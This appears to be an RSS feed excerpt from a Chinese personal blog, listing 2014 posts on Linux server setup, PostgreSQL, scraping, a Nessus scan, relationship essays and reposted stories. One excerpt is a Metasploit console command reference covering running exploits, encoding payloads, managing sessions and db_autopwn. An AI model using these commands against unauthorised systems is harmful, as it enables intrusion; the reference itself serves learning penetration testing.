&lt;p&gt;笑归笑，这样的故事我们身边又何尝是少数。潜意识里就不相信自己是被爱的，所以总要证明自己是被爱的，或者证明自己是被爱的。前者的故事很多，某个女孩偶然间知道男友的密码是自己的生日，欣喜若狂，证明了自己是被爱的，然后通过追问需要进一步证明：你是什么时候设的啊。对方答忘了。大约几月呢。对方答忘了。是年前呢还是年后呢……面对这样的追问，不知道听的人会有什么感受。当问的人不能持续证明到自己是被爱的，就开始失落：他是不是不爱我了。后者的故事也很有趣：当我故意关机2个小时，你知道我这段时间关机并且着急才能证明你是爱我的。我手机停机了你主动给我交话费才是爱我的，我过生日你主动记得我生日而且给我买玫瑰花才是爱我的。只有你做了XX，你才是爱我的，如果你没做XX，证明你不是真心爱我。当然，他们的话术常常不是这样，而是：你爱我，就应该……。例如你爱我，就应该每天给我打一个电话。还有更省略的：恋爱不就应该天天联系吗？恋爱不就应该彼此分享所有故事吗？&lt;/p&gt;
&lt;p&gt;爱总是需要被证明，才相信爱。如果有一次不能被证明，则就会陷入恐慌。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>centos部署Ganglia</title>
      <link>/posts/centos%E9%83%A8%E7%BD%B2ganglia/</link>
      <pubDate>Fri, 28 Nov 2014 17:01:10 +0000</pubDate>
      
      <guid>/posts/centos%E9%83%A8%E7%BD%B2ganglia/</guid>
      <description>Ganglia+RRDTool这对组合可以说是不错的机群监控软件了，在centos6下安装是十分简单的，服务端安装
yum install rrdtool-develyum install ganglia-gmetadyum install ganglia-web然后配置文件基本不用大量修改，位于/etc/ganglia/gmetad.</description>
    </item>
    
    <item>
      <title>iptables禁止某Ip</title>
      <link>/posts/iptables%E7%A6%81%E6%AD%A2%E6%9F%90ip/</link>
      <pubDate>Mon, 17 Nov 2014 09:55:58 +0000</pubDate>
      
      <guid>/posts/iptables%E7%A6%81%E6%AD%A2%E6%9F%90ip/</guid>
      <description>今天登录服务器一看，好家伙：
tcp 0 0 198.74.121.150:80 38.103.160.12:33873 TIME_WAIT - tcp 0 0 198.</description>
    </item>
    
    <item>
      <title>python&#43;selenium&#43;phantomjs抓取ajax动态页面</title>
      <link>/posts/python-selenium-phantomjs%E6%8A%93%E5%8F%96ajax%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Wed, 05 Nov 2014 14:52:09 +0000</pubDate>
      
      <guid>/posts/python-selenium-phantomjs%E6%8A%93%E5%8F%96ajax%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2/</guid>
      <description>一般情况下，python爬虫遇到ajax动态页面一般都是直接分析后模拟ajax请求获得数据。不过今天遇到个网站，由于某些原因不透露网址了，点击搜索按钮后，它先跳转到a页面，然后从a页面跳转到b页面，再由b页面跳回a页面。当完成这2次跳转后，ajax向a页面提交的请求才会返回结果。
也怀疑是不是cookie或者refenen的问题，但最终证实不是因为这个。即便伪造了请求头再访问a页面，返回的也不是真实的结果页面而是一段跳转到b页面的js代码。
既然不知道跳转过程中网站到底干了写什么，那就直接上大杀器吧。
phantomjs可以简单的理解为js解释器，selenium更不用多介绍了，用pip安装即可。 从 http://phantomjs.org/download.html 下载编译后的包（当然你可以自己下源码），解压后的bin目录中就是我们需要的东西。
import sysreload(sys)sys.</description>
    </item>
    
    <item>
      <title>metasploit命令参考</title>
      <link>/posts/metasploit%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83/</link>
      <pubDate>Fri, 24 Oct 2014 17:18:46 +0000</pubDate>
      
      <guid>/posts/metasploit%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83/</guid>
      <description>节选自《metasploit渗透测试指南》
show exploits 列出所有渗透攻击模块show payloads 列出所有攻击载荷show auxiliary 列出所有辅助模块search name 搜索info 列出详细信息use name 使用show options 查看参数show targets 查看某模块支持的目标平台show advanced 查看高级选项set autorunscript migrate -f 攻击完成后自动迁移到另一个进程check 检测目标是否对选定的渗透攻击存在相应的漏洞exploit 执行渗透攻击exploit -j 后台执行exploit -z 成功渗透后不与会话交互exploit -e encoder 指定攻击载荷编码方式exploit -h 帮助sessions -l 列出多个会话sessions -l -v 列出会话同时列出详细信息sessions -s scritp 在所有活跃会话中执行特定meterpreter脚本sessions -K 杀死所有活跃会话sessions -c cmd 在所有活跃会话上执行某命定sessions -u sessionID 升级一个普通的win shell 到 meterpreter shelldb_conreate name 创建数据库db_connect name 链接数据库db_namp 把namp的扫描结果存入数据库 hosts services查看结果db_autopwn -hdb_autopwn -p -r-e 对发现的所有端口执行db_autopwndb_destroy 删除当前数据库db_destory user:pswd@host:port/dbnamedb_status 查看 meterpreter命令</description>
    </item>
    
    <item>
      <title>centos安装denyhosts</title>
      <link>/posts/centos%E5%AE%89%E8%A3%85denyhosts/</link>
      <pubDate>Mon, 20 Oct 2014 17:37:42 +0000</pubDate>
      
      <guid>/posts/centos%E5%AE%89%E8%A3%85denyhosts/</guid>
      <description>最近不知道得罪了哪路大神，一直都有坏人暴力破解本站的SSH登录密码。想安安静静的写博客就这么难么&amp;hellip;没办法，那就安个denyhosts吧。
centos下直接使用Yum安装即可:yum install denyhosts.noarch
当然也可以下载编译安装。安装好后，配置文件是/etc/denyhosts.conf,参数说明如下:
SECURE_LOG = /var/log/secure#ssh日志文件
HOSTS_DENY = /etc/hosts.</description>
    </item>
    
    <item>
      <title>svn错误:a peg revision is not allowed here解决方法</title>
      <link>/posts/svn%E9%94%99%E8%AF%AF-a-peg-revision-is-not-allowed-here%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</link>
      <pubDate>Tue, 14 Oct 2014 15:43:26 +0000</pubDate>
      
      <guid>/posts/svn%E9%94%99%E8%AF%AF-a-peg-revision-is-not-allowed-here%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</guid>
      <description>今天更新文件时候，svn突然不好用了，报错：
[xsy@miss_yi bomupload]$ svn rm bom/upload/45299790@qq.com_1413255461.74.zipsvn: E200009: &#39;bom/upload/45299790@qq.com_1413255461.74.zip&#39;: a peg revision is not allowed here原因就在于文件名中的@符号，解决办法如下：</description>
    </item>
    
    <item>
      <title>一颗破碎的心，还会感到心痛吗</title>
      <link>/posts/%E4%B8%80%E9%A2%97%E7%A0%B4%E7%A2%8E%E7%9A%84%E5%BF%83%E8%BF%98%E4%BC%9A%E6%84%9F%E5%88%B0%E5%BF%83%E7%97%9B%E5%90%97/</link>
      <pubDate>Sat, 11 Oct 2014 23:56:19 +0000</pubDate>
      
      <guid>/posts/%E4%B8%80%E9%A2%97%E7%A0%B4%E7%A2%8E%E7%9A%84%E5%BF%83%E8%BF%98%E4%BC%9A%E6%84%9F%E5%88%B0%E5%BF%83%E7%97%9B%E5%90%97/</guid>
      <description>&lt;p&gt;僵尸新娘是为数不多的几部从高中看到现在依然不会厌倦的的电影之一，除了各个经典台词之外，里面的各种音乐也是超级棒。&lt;/p&gt;
&lt;p&gt;不过始终有一个问题盘桓在我脑中：维克多最后真的是因为爱才迎娶艾米莉的吗？&lt;/p&gt;
&lt;p&gt;不得不说，艾米莉对维克多是十分好的。即便维克多欺骗了自己，也很快的原谅了他，最后还用自己的身体为维克多挡下致命一刀。但促使维克多做出决定的，却是在他得知心中的白玫瑰——维多利亚要嫁给别人，而艾米莉宁愿让他走也不愿伤害他的情况下。&lt;/p&gt;
&lt;p&gt;维克多并不知道维多利亚是被迫嫁人，只好颓然的说了一句：“i&amp;rsquo;m too late.”在这种情况下，无意间听到了艾米莉对骨耐德回答，将会是一种怎样的心态呢？一方面，一个女人弃自己而去；另一方面，一个女人对自己如此深情。所以当骨耐德老人问他是否明白这种选择付出的代价时，维克多握起艾米莉的手，说：“i do.”&lt;/p&gt;
&lt;p&gt;但事情总是戏剧性的，当维克多对艾米莉说出了完整的婚礼誓言，艾米莉却看到了角落中的维多利亚。艾米莉最后决定放弃维克多，对他说出了相当经典的台词：“I was a bride. My dreams were taken from me. But now - now I&amp;rsquo;ve stolen them from someone else. I love you, Victor, but you are not mine.”&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>安装openfire后无法登录管理界面解决办法</title>
      <link>/posts/%E5%AE%89%E8%A3%85openfire%E5%90%8E%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</link>
      <pubDate>Sat, 11 Oct 2014 09:00:57 +0000</pubDate>
      
      <guid>/posts/%E5%AE%89%E8%A3%85openfire%E5%90%8E%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</guid>
      <description>&lt;p&gt;最近需要搭建一套live chat，于是选中了openfire这个比较不错的开源软件。至于介绍、安装等步骤这里不再介绍，记录一下我搭建完毕后遇到一个奇葩的问题：建立管理员账户后却无法登录后台，提示帐号不存在或者密码错误，版本是3.9.3。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>centos搭建dns服务器</title>
      <link>/posts/centos%E6%90%AD%E5%BB%BAdns%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Mon, 29 Sep 2014 11:17:13 +0000</pubDate>
      
      <guid>/posts/centos%E6%90%AD%E5%BB%BAdns%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>安装bind yum install bind
编辑/etc/named.conf，添加域配置：
zone &amp;quot;xxx.com&amp;quot; IN {type master;file &amp;quot;xxx.</description>
    </item>
    
    <item>
      <title>nessus使用记录</title>
      <link>/posts/nessus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Sun, 28 Sep 2014 09:34:55 +0000</pubDate>
      
      <guid>/posts/nessus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
      <description>至于介绍以及安装部分这里不再赘述，网上很多，可以直接下载rpm包进行安装。
fedora20安装后需要启动服务：sudo service nessusd start
浏览器访问 https://localhost:8834 即可看到nessus主界面。第一次使用时候需要注册码，翻墙去官方网站注册一个即可。
首先我们需要创建一个Policy，点击policies标签页后选择new policy，会弹出一个Policy Wizards 选择，这里我选择web application tests。</description>
    </item>
    
    <item>
      <title>Nginx&#43;Uwsgi部署Django程序</title>
      <link>/posts/nginx-uwsgi%E9%83%A8%E7%BD%B2django%E7%A8%8B%E5%BA%8F/</link>
      <pubDate>Sat, 27 Sep 2014 17:44:03 +0000</pubDate>
      
      <guid>/posts/nginx-uwsgi%E9%83%A8%E7%BD%B2django%E7%A8%8B%E5%BA%8F/</guid>
      <description>原来使用apache进行部署，感觉内存占用大以及速度比较慢就换成了nginx+uwsgi的方式，结果完爆apache啊！
首先安装nginx以及uwsgi：
yum install nginxpip install uwsgi然后编辑uwsgi的配置文件，这里我使用ini文件格式，示例如下：
[uwsgi]socket = 127.</description>
    </item>
    
    <item>
      <title>tightvnc远程访问kali桌面系统</title>
      <link>/posts/tightvnc%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEkali%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F/</link>
      <pubDate>Fri, 26 Sep 2014 18:23:36 +0000</pubDate>
      
      <guid>/posts/tightvnc%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEkali%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F/</guid>
      <description>安装完kali系统后应该已经默认安装了这个程序，如果没有的话使用apt-get install tightvncserver
安装完成后执行
tightvncserver -depth 24 -geometry 1440x900 :1-depth 24 使用24位颜色，这里一般用16或者24</description>
    </item>
    
    <item>
      <title>python中and-or小技巧</title>
      <link>/posts/python%E4%B8%ADand-or%E5%B0%8F%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Thu, 11 Sep 2014 16:22:43 +0000</pubDate>
      
      <guid>/posts/python%E4%B8%ADand-or%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
      <description>首先，python中逻辑运算从左到右进行，and运算返回第一个假值，若都为真则返回最后一个真值。or运算返回第一个真值，若都为假则返回最后一个假值。
其次，python中0,(),[],{},None,空字符串都是假。
下面用简单的例子说明一下：
def f():print &amp;#34;in f&amp;#34;return Falsedef t():print &amp;#34;in t&amp;#34;return Truedef n():print &amp;#34;in n&amp;#34;In [105]: r = t() and f() or n()in tin fin nIn [106]: rIn [107]: r = t() and n() or f()in tin nin fIn [108]: rOut[108]: FalseIn [111]: r = f() and n() or t()in fin tIn [112]: rOut[112]: True上面我们定义了3个函数，没返回值的情况下函数会默认返回None。这里有个地方需要注意，虽然函数可以返回true、false、none，但函数本身都是为真的，比如：</description>
    </item>
    
    <item>
      <title>centos下部署openerp7</title>
      <link>/posts/centos%E4%B8%8B%E9%83%A8%E7%BD%B2openerp7/</link>
      <pubDate>Fri, 22 Aug 2014 11:26:53 +0000</pubDate>
      
      <guid>/posts/centos%E4%B8%8B%E9%83%A8%E7%BD%B2openerp7/</guid>
      <description>首先需要注意的是openerp7需要python2.7+版本，而centos6下默认是python2.6，这里我使用centos7。
首先安装postgresql
yum install http://yum.postgresql.org/9.3/redhat/rhel-6-x86_64/pgdg-redhat93-9.3-1.noarch.rpmyum install postgresql93-server postgresql93-contrib postgresql93-develcentos7中安装psql后初始化数据库和6不同，需要切换到postgres用户进入安装目录的bin文件夹执行手动初始化</description>
    </item>
    
    <item>
      <title>postgresql学习记录3</title>
      <link>/posts/postgresql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%953/</link>
      <pubDate>Thu, 07 Aug 2014 12:32:57 +0000</pubDate>
      
      <guid>/posts/postgresql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%953/</guid>
      <description>某些情况下需要向数据库中插入媒体文件，mysql中插入媒体文件时，数据字段应该是blob。而对于postgresql，则是bytea。这里注意的是打开文件时候应该用&amp;quot;rb wb&amp;quot;这种模式，示例如下：
import psycopg2#省略部分代码... def ins_pictures(self, name, position, explain, href, uploaddate, img, show_id):&amp;#39;&amp;#39;&amp;#39;向pictures表中插入数据(显示位置，说明，上传时间，图片的2进制)&amp;#39;&amp;#39;&amp;#39;strs = r&amp;#34;insert into pictures(p_name,p_position,p_explain,p_href,p_uploaddate,p_show,p_img,show_id) values (%(name)s,%(position)s,%(explain)s,%(href)s,%(uploaddate)s,&amp;#39;0&amp;#39;,%(img)s,%(show_id)s)&amp;#34;self.</description>
    </item>
    
    <item>
      <title>postgresql学习记录2</title>
      <link>/posts/postgresql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%952/</link>
      <pubDate>Wed, 06 Aug 2014 09:24:22 +0000</pubDate>
      
      <guid>/posts/postgresql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%952/</guid>
      <description>想把mysql数据迁移到postgresql，推荐使用py-mysql2pgsql，使用pip安装即可。
安装完毕后执行py-mysql2pgsql后会在当前目录生成一个yaml文件，根据实际情况修改，例如：
# if a socket is specified we will use that# if tcp is chosen you can use compressionmysql:hostname: localhostport: 3306socket: /var/lib/mysql/mysql.</description>
    </item>
    
    <item>
      <title>postgresql学习记录1</title>
      <link>/posts/postgresql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</link>
      <pubDate>Wed, 06 Aug 2014 09:14:31 +0000</pubDate>
      
      <guid>/posts/postgresql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</guid>
      <description>数据库9.3.5，系统fedora20,不同系统操作略有不同。
使用yum 命令安装即可：sudo yum install postgresql,postgresql-server
安装完毕后系统中会创建一个postgres的用户，切换到这个用户后进行数据库的初始化：
initdb --encoding=UTF-8 --no-locale -D /var/lib/pgsql/data/或者使用postgresql-setup initdb 命令。</description>
    </item>
    
    <item>
      <title>枯萎的花（转）</title>
      <link>/posts/%E6%9E%AF%E8%90%8E%E7%9A%84%E8%8A%B1%E8%BD%AC/</link>
      <pubDate>Wed, 09 Jul 2014 01:05:23 +0000</pubDate>
      
      <guid>/posts/%E6%9E%AF%E8%90%8E%E7%9A%84%E8%8A%B1%E8%BD%AC/</guid>
      <description>碎碎第一次睁开眼时，一只小花蝴蝶正受惊般地从她眼前飞过，耳畔传来姐姐们欣喜的叫喊声:”妹妹醒啦，妹妹醒啦!” 碎碎茫然地看了看四周，初生的太阳放射出明亮的光芒，照耀在姐姐们娇艳的笑靥上，她们围在碎碎身边，欢喜地迎接妹妹的到来。这里到处是山，古藤绝壁，山涧幽鸣，石壁上有一座小而庄严的寺庙，庙前的小径蜿然伸向远方。 从那时起，碎碎来到了这个世界，开始了她的生活，每天在寺庙的钟声在醒过来，和姐妹们一同歌唱，同过路的蝴蝶翩翩起舞，夜晚就静静仰望着星空，在一片木鱼诵佛声中沉沉睡去。日子过得快乐而单调。 直到有一天，清晨的薄雾还没有消散。”的嗒”的马蹄声踏破了山间的寂静，惊醒了沉睡中的碎碎。她睁大眼睛，看到薄雾中出现了一个骑马的男子。他是个二十来岁的年轻人，穿着沾满灰尘的衣裳，有一双和气的大眼睛。他似乎赶了很久的路，又渴又饿，脸色苍白而憔悴。 他抬头看到绝壁下的古寺，惊喜在他的眼眸里闪过，就如漂浮在汪洋里的落水者看到了救命的木板，男子向寺庙驰去。可他毕竟太衰弱了，所以没等他摇摇晃晃地走上去叩响寺门，连日来的奔波，疲乏，病痛就把他击倒在了寺前的台阶上。 碎碎一动不动地注视着那个卧倒在地上的陌生人，直到天边露出朝霞，早起的僧人惊讶地发现了那个奄奄一息的旅人并把他扶了进去。接连几天，姐妹们都发现碎碎心事重重，落落寡欢。她们在她的身边纵情歌唱，可碎碎的目光却一直投向寺庙的方向。 终于有一天，碎碎又看到了那个年轻人。她全身一震，兴奋传遍了全身。男子的脸色依然苍白，可只要仔细看，你就会发现他的两颊已经隐隐透出了红润。男子站在寺门前，他看了看这边，眼睛一亮，就笔直地走了过来。他站在树下，深深地吸了一口香气:”好美的桃花!”他甚至还用手指碰了碰碎碎。碎碎羞涩地低下头去，脸儿都有红了。 碎碎默默地注视着男子的背影。她猛然便爱上了他。我在佛祖前求了五百年，才在他要经过的路上，伸展出最美丽的姿态，绽放出最妩媚的容颜。他，正是我这辈子要等待的人。 男子每天都会来树下站一会，黑蓝黑蓝的眼睛久久凝视着美丽的桃花，透露出无限的深情。他的身体一天天康复着，当青春和活力重新注入他的身体后，大家都发现原来他是一个十分好看的人。 那个夜晚，男子窗前的烛光久久未熄。分别的时刻到来了。碎碎做出了艰难的决择:她要跟着那个人走。忧心仲仲的姐妹们纷纷劝阻她:”离了枝头，你就活不了了。” “他是个人，你和他是没有结果的。” 碎碎坚定地沉默着。那一夜，繁星满天，在初夏的深山里，在一座百年的古刹前，一株开得灼灼其华的桃花，为她们即将远去姐妹的命运担忧着，一夜未眠。 当第一缕阳光照在峰头，寺门”吱呀”一声开了。牵着马的男子拱手做别了寺里的僧人，策马驰去。当他经过桃树时，碎碎用力一挣，脱离了枝头，在姐妹们悲伤的呼喊和叹息声中，一头扑进了男子的怀里，多么温暖!</description>
    </item>
    
    <item>
      <title>花鬼（转）</title>
      <link>/posts/%E8%8A%B1%E9%AC%BC%E8%BD%AC/</link>
      <pubDate>Wed, 09 Jul 2014 01:01:15 +0000</pubDate>
      
      <guid>/posts/%E8%8A%B1%E9%AC%BC%E8%BD%AC/</guid>
      <description>阴风阵阵 雨萋萋 夜色的深处某个不知名的角落里 或许正卷曲着一个 冤屈的灵魂 世界上真的有鬼吗 或许鬼只是人潜意识里某种无法自我的思维 也或许是一种科学还难以解释的现象 我还是很小的时候 听妈妈说我是个很爱哭爱闹的小调皮 特别到晚上总是爱哭 所以每天晚上妈妈总是唱歌谣 或讲故事给我听 很多都是些鬼故事 我想也许是因为比较恐怖吧所以 到现在有些还有很深的印象 以前我的姥姥（外婆）家是个不知名的小地方 而且那里是个叫偏僻的地方 所以一年到头那里也不会有什么外来人口 更别说什么游客了 只是偶尔会有张家的远方表亲来了 李家的远方XX来了 赵家的远方XX 来了 每年春天或快春节的时候小村子里会热闹些 不是谁家的姑娘出嫁 就是谁家的小子娶媳妇 要不就是 谁家的老人过世 又是一年的春天到了 不过这个春天来的有点晚因为是润月 所以都快四月了还是不大暖和 一大早还只有 七 八 岁的 妈妈起的很早 刚要吃早饭的妈妈 缠着我的外婆说 今天吃什么呀 姥姥说随便吃点吧 一会我要出去下 我门隔壁家的 张奶奶老了（死了） 妈妈说真的啊 不是前几天还好好的吗 是怎么死的呀 姥姥看看妈妈 说小孩子家不要打听那么多 妈妈很是不高兴的撇撇嘴走开了 过了后天妈妈才知道 原来那个张奶奶是 暴病死的 据说其中还有些古怪那 听人家说张奶奶年轻的时候可是十里八村出了名的美女 追她的 暗地里想他的小伙子可以说是排成了对 可是不知道为什么最后 这为美女最后却下嫁给了一个不怎么样的男人 或许有什么原因也或许是因为爱情 但是结婚后那些追求着还是 穷追不舍 最后张奶奶的老公 很早的就去世了 很多人说是 因为追她的人太多是被活活气死的 那年张奶奶才四十多岁 她一个人带着三个儿女 从此过着平淡的日子 虽然日子很清苦 但是儿女还算孝顺都很听话 就在她老头死了没多久老奶奶种了棵苦丁香 也许是处于对她老头子的怀念 不论晴天雨天 春天还是飘雪的冬天只要是吃过饭老奶奶都会做在树下望着丁香树 树也好像有了灵性 枝叶摇摆发出 沙沙的声音象是在和老奶奶对话 每年春天丁香花开 老奶奶都要大病一场 在床上一躺就是大班半个月甚至要将近一个月 时间过的真快随着燕子的悦耳鸣叫声 新的一年春天又来到了 可是老奶奶的身体却好像越来越差了 而她深爱的那棵丁香树显的越发精神 村子里的人议论也越来越多了 闲话也越传越神 有的说她家里闹鬼 说晚上 经常看到她死去很久的老头子蹲在门口抽烟 还说她家院子里的那棵丁香树就是她老头子的化身 说是因为那棵树在吸她的血所以树才长的那么郁郁葱葱 老奶奶的儿女一直说要把那棵树移走 或砍了 可是老奶奶就是不让 没次说到要砍树的事老奶奶总是闹着要死说 你们的爸爸死了也没人陪我了我现在只有这棵树陪我了 要是你们把树砍了那我也活着没什么意思了 所以儿女也拿她没有办法 可是老奶奶的身体真的是一天不如一天就象树上秋天的落叶一样随时都有凋谢的危险 春天的气候虽不一片骄阳但旷野处也到处生机萌生 随眼望去都不在是枯黄 而是淡淡的绿 田野里也都是忙着耕种的人们 但在这位老奶奶的家里却好似到了秋天一样冷冷清清 屋子里的气氛好像随时要停止凝结 老奶奶躺在床上咳的很是厉害 而且好像已经不在只是咳了 而是在吐血 她怕儿女担心她每咳一次都是用手帕捂着嘴 但是她嘴角的血却被细心的儿女察觉了 老奶奶最疼的小女儿哭着扑在老奶奶怀里 她强打精神笑着 摸着女儿的头说 别哭乖 我没事你们不要担心 如果我真的有事你们也不要伤心 我只是太思念你们的父亲 我早该去和他团聚去了 现在你们都大了我也没有什么放心不下的了 说到着老奶奶环顾了下屋子然后说这些年我身体一直不好 这个家全靠你们的大家操持了以后我要是去了你们要听她的话 知道吗不要让我在地下担心 说到这里儿女们哭的更是厉害了 风沙沙的 吹着丁香树 淡淡的香气 飘满了整个院子 飘到了老奶奶的房间 睡梦中的老奶奶闻到了香气 人也显的格外精神 一个多月没有下床的她 批上了衣服趁着夜色走出了屋外 老到了树下 手抚摸着树说 老头子我们就要团聚了 你当初一下子走了 真是狠心 你不知道我这么多年是怎么过来的 说着老奶奶抱着树哭了起来树也好象哭了一样枝叶也跟着抖动了起来 突然有一条象红色的线一样的血一样的从树的枝干上流了下来 老奶奶手摸到了 猛的抬头说老头子你怎么也哭了 这时候突然阴云密布 狂风突起 只见一道白光一闪 树象是被什么劈开了一样 断成了两节 只见树的中间鲜血淋淋 老奶奶被突来的状况一下子吓的晕了过去 不知道过了多久天边微蓝 早起的大女儿看到了躺在了地上的老奶奶还有段成两节的丁香树 吓的喊了出来 屋子里的弟弟妹妹也都被喊声惊醒都跑出了屋子 此时老奶奶已经浑身冰凉 僵硬了 可是老奶奶的表情很安祥还带着微笑手紧经的抱着那棵鲜血淋淋的树 老奶奶就这样走了 故事讲到这里按理说该是讲完了 可是自从儿女们把老奶奶安葬后 他们家的院子里又长出了两棵新的丁香树 人们都说 可能是 老奶奶和老爷爷放心不下他们的儿女 所以在次化为丁香树 每天守候着他们的儿女们 这正是 丁香有情 人有意 情缘难段 悲切切 思思春色 灌大地 人间处处都是春 </description>
    </item>
    
    <item>
      <title>血泪玖瑰（转）</title>
      <link>/posts/%E8%A1%80%E6%B3%AA%E7%8E%96%E7%91%B0%E8%BD%AC/</link>
      <pubDate>Wed, 09 Jul 2014 01:00:01 +0000</pubDate>
      
      <guid>/posts/%E8%A1%80%E6%B3%AA%E7%8E%96%E7%91%B0%E8%BD%AC/</guid>
      <description>我没有再对蔷薇作任何诠释，玫瑰也好，蔷薇也罢，都只有一瞬的美丽，它们会争艳地开放，可是也在一瞬间就凋零了。 　我睁眼的一瞬，看见了一大束的蔷薇，依然鲜活着，可知道，它们马上就会失去光彩，成为枯萎的花尸。曾经说过，我喜欢蔷薇，因为它比玫瑰有更加持久的生命力，但又不失玫瑰的娇媚，又增添了一份野性。 　接着，我闻到一股气味，不是蔷薇的香气，而是消毒水的味道，再看周围，才发现自己置身在一个陌生的环境，直觉告诉我，这是医院。我不止到到底发生了什么事情，我努力的回想着，一股血腥味涌了上来，便昏睡过去了。 　再度醒来时，我看到了爸妈，还有一个我不认识的人，那束蔷薇已经没有生气，花瓣也开始脱落。我询问着，发生了什么事？自己怎么会在这儿？那个陌生的人说着，我发生了车祸。我又问，你是谁？他连同爸妈都“啊”了一声，接着爸叫来了医生，为我检查了一番，后来不知道他们说了些什么，我又昏沉沉的睡着了。在睡梦中我来到了一间屋子，满屋子的蔷薇，把我慢慢的淹没，最终我也成了一朵蔷薇，鲜红的，有人把我从中挑了去，细心的呵护着。 　我好累，好累，在心中不停的说着。你不能睡，你不能睡，一个声音又不停的钻进我的耳朵，我要知道那是谁，吃力地张开眼睛，又是那个陌生人，他到底是谁呢？为什么我对他一点印象都没有呢？ 　不知在医院里躺了多久，那个陌生的他每天都会捧一束鲜活的蔷薇来代替那束快要枯萎的。我讨厌医院的气味，在稍微有些好转时，便要求出了院。 　在我的记忆中，唯一缺残的就是那车祸和他，无论我怎么努力，也无法记起，似乎一切都停留在那场车祸以前。 　在家中休息了大约一个月，他依然每天都会来看我，每次都有蔷薇，可我仍想不起他，真的很痛苦。后来我便去了公司，原来他和我是同事，我也知道，我和他的关系以前应该很亲密的。 　他会接我上班，下班送我回家，依然有蔷薇，我也很自然地一直和他好，我想自己以前会选他，自然有我的道理。 　有一天，他来接我上班，奇怪的是手中没有蔷薇，我很不习惯，缺少了之后才发现自己喜欢上了他的蔷薇无法割舍了。一路上我闷闷不乐，独自生气，他似乎看出了我的心思，在路上停了下来。你等我一下，我到对街买点东西。我点了点头，看他往对街走过去。一瞬，似乎觉得这一切都好熟悉。 　等了一会，我见到他从一家店走了出来，手上捧着一大束蔷薇，在阳光下，蔷薇很耀眼，而他也更加刺目。我笑了，不知不觉朝他走区，没有顾及路上的行车，像着了魔一般。小心，我听到他狂叫着，只见他的手向我乱挥，我僵持在原地，不知道发生了什么事，猛的他向我冲来，把我狠推了一把，我重重的摔了出去。那一刻，我记起了先前的车祸，也是这样，只是他没来得及推我，我们便都倒地了，我们？我的脑又开始痛了，到底怎么了？明明我和他都出了车祸，为什么他没提呢？我看到他被车撞倒了，在手上的蔷薇被血染成了鲜红，好艳，好痛，又失去了知觉。 　我又开始昏睡，在睡梦中我见到了他，他手上捧着蔷薇，鲜红的，不停的和我说，我会呵护她，呵护属于我一生的蔷薇，不会再让她受伤，不会……只见他慢慢的远去，消失在夜空中，可我还是看见了他眼角的泪，滴在蔷薇上，晶莹的。 　醒了，醒了，在吵闹声中，我睁开了眼，依然是爸妈，只是环境不再陌生，不久前，我就住在这里，没有了蔷薇，也没有了他。 　我睡了多久了？整整一年了。总算醒了，妈说着流泪了。我没想到自己已经睡了这么久。今天是几号？2001年9月6日。啊？一年？我明明前天才出车祸的。他呢？妈呜咽着，爸开口说，车祸那天，他就因失血过多走了。啊？一时间停止了所有的思维，怎么会是这样呢？可到底是哪次车祸呢？我出了几次车祸？几次？一次就已经差点醒不来，还要几次？妈说着，不过现在好了，醒了就好，不要再想了。 　一次？明明出了两次车祸，妈怎么说才一次呢？我真的不懂，真的不懂。 　隐约当中，我又听到一个声音，我会呵护她，呵护属于我一生的蔷薇，不会让她再受伤，不会…… 　我痊愈后，去看了他，带上了蔷薇，是鲜红的那种，站了很久，在临走前，眼角滑落了一滴泪，落在了花瓣上，好艳！</description>
    </item>
    
    <item>
      <title>午夜兰花（转）</title>
      <link>/posts/%E5%8D%88%E5%A4%9C%E5%85%B0%E8%8A%B1%E8%BD%AC/</link>
      <pubDate>Wed, 09 Jul 2014 00:58:43 +0000</pubDate>
      
      <guid>/posts/%E5%8D%88%E5%A4%9C%E5%85%B0%E8%8A%B1%E8%BD%AC/</guid>
